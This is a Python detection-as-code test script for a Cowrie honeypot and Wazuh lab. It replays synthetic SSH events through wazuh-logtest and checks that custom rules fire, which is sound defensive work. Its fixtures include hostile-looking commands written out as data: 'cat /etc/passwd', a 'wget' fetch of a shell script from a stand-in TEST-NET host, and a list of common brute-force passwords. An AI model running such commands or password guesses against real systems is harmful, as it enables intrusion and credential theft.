#!/usr/bin/env python3
"""
Detection-as-code test for the Cowrie honeypot rules.
=====================================================

Replays known Cowrie events through the running Wazuh manager's `wazuh-logtest`
and asserts that each one fires the rule it is supposed to. This is the same idea
as a unit test suite, but for detection rules: change a regex or a threshold in
`rules/local_rules.xml`, run this, and find out immediately whether you broke a
detection instead of discovering it live during an incident.

How it works
------------
For each case, the event JSON is piped into
`docker exec -i <manager> /var/ossec/bin/wazuh-logtest`, which runs the full
decode + rule pipeline exactly as the live manager would, and the expected rule
id is matched against what actually fired.

Prerequisites
-------------
- The lab stack is up (`docker compose up -d` in wazuh-docker/single-node).
- The custom rules are loaded (`pwsh wazuh/apply-custom-rules.ps1`).
- The manager container is running. Default name is `single-node-wazuh.manager-1`;
  override with  --manager <name>  or the WAZUH_MANAGER env var.

Usage
-----
    python tests/test_detections.py
    python tests/test_detections.py --manager single-node-wazuh.manager-1

Exit codes: 0 all passed, 1 one or more assertions failed, 2 could not reach the
manager (wrong container name, stack not up, rules not loaded).
"""

import argparse
import json
import os
import re
import subprocess
import sys

SRC = "203.0.113.7"   # TEST-NET-3 (RFC 5737): makes clear these are synthetic fixtures
SESSION = "d15ea5e70001"


def connect(port):
    return {"eventid": "cowrie.session.connect", "src_ip": SRC, "src_port": port,
            "dst_ip": "172.18.0.2", "dst_port": 2222, "session": SESSION, "protocol": "ssh",
            "message": f"New connection: {SRC}:{port}", "timestamp": "2026-06-04T02:48:43.294886Z"}


def failed(password):
    return {"eventid": "cowrie.login.failed", "username": "root", "password": password,
            "src_ip": SRC, "session": SESSION, "protocol": "ssh",
            "message": f"login attempt [root/{password}] failed",
            "timestamp": "2026-06-04T02:48:43.369802Z"}


def success(password):
    return {"eventid": "cowrie.login.success", "username": "root", "password": password,
            "src_ip": SRC, "session": SESSION, "protocol": "ssh",
            "message": f"login attempt [root/{password}] succeeded",
            "timestamp": "2026-06-04T02:48:44.000000Z"}


def command(text):
    return {"eventid": "cowrie.command.input", "input": text, "src_ip": SRC,
            "session": SESSION, "protocol": "ssh", "message": f"CMD: {text}",
            "timestamp": "2026-06-04T02:48:49.000000Z"}


# Each case: (name, expected_rule_id, [events...]). Single-event cases test the
# deterministic pattern rules; the multi-event cases at the bottom exercise the
# stateful frequency/correlation rules by feeding a whole burst in one session.
CASES = [
    ("new SSH connection",                100101, [connect(40001)]),
    ("failed login",                      100102, [failed("admin")]),
    ("successful login",                  100103, [success("hunter2")]),
    ("command executed in session",       100106, [command("ls -la")]),
    ("recon command (cat /etc/passwd)",   100107, [command("cat /etc/passwd")]),
    ("recon command (uname)",             100107, [command("uname -a")]),
    ("payload download (wget)",           100108, [command("wget http://203.0.113.10/x.sh")]),

    # Correlation rules. State accumulates across lines within one logtest session.
    ("brute force: 8 failures, one IP",   100104,
        [failed(p) for p in ("admin", "password", "123456", "12345", "root",
                             "toor", "qwerty", "letmein")]),
    ("success straight after brute force", 100105,
        [failed(p) for p in ("admin", "password", "123456", "12345", "root",
                             "toor", "qwerty", "letmein")] + [success("hunter2")]),
    ("rapid connections (scan/automation)", 100110,
        [connect(40010 + i) for i in range(12)]),
]


def run_logtest(manager, events):
    """Feed events (list of dicts) to wazuh-logtest, return combined output text."""
    payload = "".join(json.dumps(e) + "\n" for e in events)
    proc = subprocess.run(
        ["docker", "exec", "-i", manager, "/var/ossec/bin/wazuh-logtest"],
        input=payload, capture_output=True, text=True,
    )
    return (proc.stdout or "") + (proc.stderr or "")


def fired(output, rule_id):
    """True if wazuh-logtest reported the given rule id in a Phase 3 block.
    Anchored on the `id: '<n>'` line so it never matches a decoder field or
    the mitre.id list."""
    return re.search(r"(?<!\.)\bid: '%d'" % rule_id, output) is not None


def preflight(manager):
    """Confirm we can reach the manager and the custom rules are actually loaded.
    Returns None on success, or an error string to print and bail on."""
    probe = run_logtest(manager, [failed("preflight")])
    if "No such container" in probe or "Cannot connect to the Docker daemon" in probe:
        return (f"Could not reach manager container '{manager}'.\n"
                "Is the stack up? Try:  docker compose ps  in wazuh-docker/single-node,\n"
                "then pass the right name with  --manager <name>.")
    if "command not found" in probe or "executable file not found" in probe:
        return "Docker CLI not found on PATH. Install/enable Docker Desktop and retry."
    if not fired(probe, 100102):
        return ("Reached the manager, but the base failed-login rule (100102) did not fire.\n"
                "The custom rules are probably not loaded. Run:  pwsh wazuh/apply-custom-rules.ps1")
    return None


def main():
    ap = argparse.ArgumentParser(description="Replay Cowrie events through wazuh-logtest and assert rule ids.")
    ap.add_argument("--manager", default=os.environ.get("WAZUH_MANAGER", "single-node-wazuh.manager-1"),
                    help="Wazuh manager container name (default: single-node-wazuh.manager-1).")
    args = ap.parse_args()

    print(f"Detection tests against manager '{args.manager}'\n")
    err = preflight(args.manager)
    if err:
        print("PREFLIGHT FAILED\n" + err)
        return 2

    passed = failed_count = 0
    for name, expected, events in CASES:
        out = run_logtest(args.manager, events)
        ok = fired(out, expected)
        print(f"  [{'PASS' if ok else 'FAIL'}]  rule {expected}  <-  {name}")
        if ok:
            passed += 1
        else:
            failed_count += 1

    print(f"\n{passed} passed, {failed_count} failed, {len(CASES)} total")
    return 0 if failed_count == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
